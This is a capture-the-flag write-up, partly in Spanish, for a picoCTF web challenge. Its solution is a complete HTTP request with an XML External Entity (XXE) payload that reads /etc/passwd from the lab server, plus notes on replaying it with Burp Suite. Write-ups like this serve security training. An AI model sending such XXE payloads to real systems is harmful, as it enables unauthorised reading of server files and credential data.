#### Descripción 
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

http://saturn.picoctf.net:55700/

#### Solución
```
POST /data HTTP/1.1
Host: saturn.picoctf.net:55700
Content-Length: 142
Accept-Language: es-419,es;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:55700
Referer: http://saturn.picoctf.net:55700/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
			    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><ID>
&xxe;
</ID></data>
```
#### Notas
Se puede cambiar el archivo xml que surge tras las respuestas de apretar los botones de la pagina, con ayuda de burpsuite lo mandamos a un entorno controlado como llamado repeater y con vulnerabilidades tipo `xxe` logramos entrar al archivo passwd donde estaba la llave
#### Referencias
https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=67&t=183s